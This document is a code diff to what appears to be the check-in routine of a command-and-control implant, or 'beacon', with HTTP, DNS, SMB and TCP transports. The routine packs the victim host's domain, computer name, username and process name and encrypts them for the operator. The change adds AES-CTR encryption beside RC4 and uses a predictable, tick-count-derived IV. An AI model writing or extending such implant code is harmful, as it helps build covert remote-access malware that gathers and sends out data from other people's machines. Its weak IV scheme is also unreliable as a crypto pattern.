@@ -106,41 +106,81 @@ BYTE* Agent::BuildBeat(ULONG* size)
 	packer->PackStringA(this->info->username);
 	packer->PackStringA(this->info->process_name);
 
-	EncryptRC4(packer->data(), packer->datasize(), this->config->encrypt_key, 16);
+	ULONG plainSize = packer->datasize();
+	PBYTE plainData = packer->data();
+	BOOL useAes = (this->config->crypto_type == CRYPTO_AES);
+
+#if defined(BEACON_HTTP) || defined(BEACON_DNS)
+
+	ULONG ivSize = useAes ? 16 : 0;
+	ULONG beat_size = ivSize + plainSize;
+	PBYTE beat = (PBYTE)MemAllocLocal(beat_size);
+	if (beat) {
+		if (useAes) {
+			DWORD tick = ApiWin->GetTickCount();
+			for (int i = 0; i < 16; i++) {
+				beat[i] = (BYTE)(tick ^ (i * 7919) ^ (i << 3) ^ ((tick >> (i % 8)) & 0xFF));
+				tick = tick * 1103515245 + 12345;
+			}
+			memcpy(beat + 16, plainData, plainSize);
+			AesCtrEncryptBuffer(beat + 16, plainSize, this->config->encrypt_key, 16, beat, 16);
+		} else {
+			memcpy(beat, plainData, plainSize);
+			EncryptRC4(beat, plainSize, this->config->encrypt_key, 16);
+		}
+	}
+	MemFreeLocal((LPVOID*)&plainData, plainSize);
+
+#elif defined(BEACON_SMB) 
+
+	ULONG ivSize = useAes ? 16 : 0;
+	ULONG beat_size = 4 + ivSize + plainSize;
+	PBYTE beat = (PBYTE)MemAllocLocal(beat_size);
+	if (beat) {
+		memcpy(beat, &(this->config->listener_type), 4);
+		if (useAes) {
+			DWORD tick = ApiWin->GetTickCount();
+			for (int i = 0; i < 16; i++) {
+				beat[4 + i] = (BYTE)(tick ^ (i * 7919) ^ (i << 3) ^ ((tick >> (i % 8)) & 0xFF));
+				tick = tick * 1103515245 + 12345;
+			}
+			memcpy(beat + 4 + 16, plainData, plainSize);
+			AesCtrEncryptBuffer(beat + 4 + 16, plainSize, this->config->encrypt_key, 16, beat + 4, 16);
+		} else {
+			memcpy(beat + 4, plainData, plainSize);
+			EncryptRC4(beat + 4, plainSize, this->config->encrypt_key, 16);
+		}
+	}
+	MemFreeLocal((LPVOID*)&plainData, plainSize);
+
+#elif defined(BEACON_TCP) 
+
+	ULONG ivSize = useAes ? 16 : 0;
+	ULONG beat_size = 4 + ivSize + plainSize;
+	PBYTE beat = (PBYTE)MemAllocLocal(beat_size);
+	if (beat) {
+		memcpy(beat, &(this->config->listener_type), 4);
+		if (useAes) {
+			DWORD tick = ApiWin->GetTickCount();
+			for (int i = 0; i < 16; i++) {
+				beat[4 + i] = (BYTE)(tick ^ (i * 7919) ^ (i << 3) ^ ((tick >> (i % 8)) & 0xFF));
+				tick = tick * 1103515245 + 12345;
+			}
+			memcpy(beat + 4 + 16, plainData, plainSize);
+			AesCtrEncryptBuffer(beat + 4 + 16, plainSize, this->config->encrypt_key, 16, beat + 4, 16);
+		} else {
+			memcpy(beat + 4, plainData, plainSize);
+			EncryptRC4(beat + 4, plainSize, this->config->encrypt_key, 16);
+		}
+	}
+	MemFreeLocal((LPVOID*)&plainData, plainSize);
+
+#endif
 
 	MemFreeLocal((LPVOID*)&this->info->domain_name,   StrLenA(this->info->domain_name));
 	MemFreeLocal((LPVOID*)&this->info->computer_name, StrLenA(this->info->computer_name));
 	MemFreeLocal((LPVOID*)&this->info->username,      StrLenA(this->info->username));
 	MemFreeLocal((LPVOID*)&this->info->process_name,  StrLenA(this->info->process_name));
-
-#if defined(BEACON_HTTP) || defined(BEACON_DNS)
-
-	ULONG beat_size = packer->datasize();
-	PBYTE beat      = packer->data();
-
-#elif defined(BEACON_SMB) 
-
-	ULONG beat_size = packer->datasize() + 4;
-	PBYTE beat      = (PBYTE)MemAllocLocal(beat_size);
-
-	memcpy(beat, &(this->config->listener_type), 4);
-	memcpy(beat+4, packer->data(), packer->datasize());
-
-	PBYTE pdata = packer->data();
-	MemFreeLocal((LPVOID*)&pdata, packer->datasize());
-
-#elif defined(BEACON_TCP) 
-
-	ULONG beat_size = packer->datasize() + 4;
-	PBYTE beat      = (PBYTE)MemAllocLocal(beat_size);
-
-	memcpy(beat, &(this->config->listener_type), 4);
-	memcpy(beat + 4, packer->data(), packer->datasize());
-
-	PBYTE pdata = packer->data();
-	MemFreeLocal((LPVOID*)&pdata, packer->datasize());
-
-#endif
 
 	delete packer;
 
